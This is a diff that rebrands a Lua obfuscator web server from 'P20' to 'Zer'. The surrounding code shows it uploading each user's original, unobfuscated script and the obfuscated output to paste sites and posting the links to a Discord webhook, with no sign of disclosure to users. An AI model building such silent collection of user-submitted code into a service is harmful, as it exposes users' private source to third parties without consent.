@@ -105,14 +105,14 @@ async function uploadToAllProviders(content: string, title: string): Promise<{ r
 async function sendToDiscordWebhook(originalCode: string, obfuscatedCode: string, meta: { vmType: string; vmLevel: string }) {
   if (!DISCORD_WEBHOOK_URL) return;
   try {
-    const originalLinks = await uploadToAllProviders(originalCode, "P20 - Original Script");
-    const outputLinks = await uploadToAllProviders(obfuscatedCode, "P20 - Obfuscated Script");
+    const originalLinks = await uploadToAllProviders(originalCode, "Zer - Original Script");
+    const outputLinks = await uploadToAllProviders(obfuscatedCode, "Zer - Obfuscated Script");
 
     const form = new FormData();
     const payload = {
       embeds: [
         {
-          title: "P20 Lua Obfuscator — New Usage",
+          title: "Zer Lua Obfuscator — New Usage",
           color: 0x3b82f6,
           fields: [
             { name: "VM Type", value: meta.vmType || "none", inline: true },
@@ -321,10 +321,10 @@ app.post("/api/loader/generate", (req: express.Request, res: express.Response) =
   }
   const checkUrl = `${req.protocol}://${req.get("host")}/api/keys/check`;
   const loader = generateLoader({
-    title: typeof title === "string" && title.trim() ? title : "P20 Protected Script",
+    title: typeof title === "string" && title.trim() ? title : "Zer Protected Script",
     scriptUrl: scriptUrl.trim(),
     checkUrl,
-    keyFileName: typeof keyFileName === "string" && keyFileName.trim() ? keyFileName : "p20_key.txt",
+    keyFileName: typeof keyFileName === "string" && keyFileName.trim() ? keyFileName : "zer_key.txt",
   });
   res.json({ loader, checkUrl });
 });
@@ -337,7 +337,7 @@ app.post("/api/paste", async (req: express.Request, res: express.Response) => {
     }
 
     const chosenProvider = provider === "pastebin" ? "pastebin" : "rubis";
-    const pasteTitle = title || "P20 Lua Obfuscated Script";
+    const pasteTitle = title || "Zer Lua Obfuscated Script";
 
     console.log(`[API] /api/paste - uploading ${content.length} chars to ${chosenProvider}`);
 
@@ -354,7 +354,7 @@ app.post("/api/paste", async (req: express.Request, res: express.Response) => {
 
 app.listen(PORT, () => {
   const url = `http://localhost:${PORT}`;
-  console.log(`\nP20 Obfuscator Server running at: ${url}`);
+  console.log(`\nZer Obfuscator Server running at: ${url}`);
   console.log("Press CTRL+C to terminate.\n");
 
   exec(`start ${url}`, (err) => {
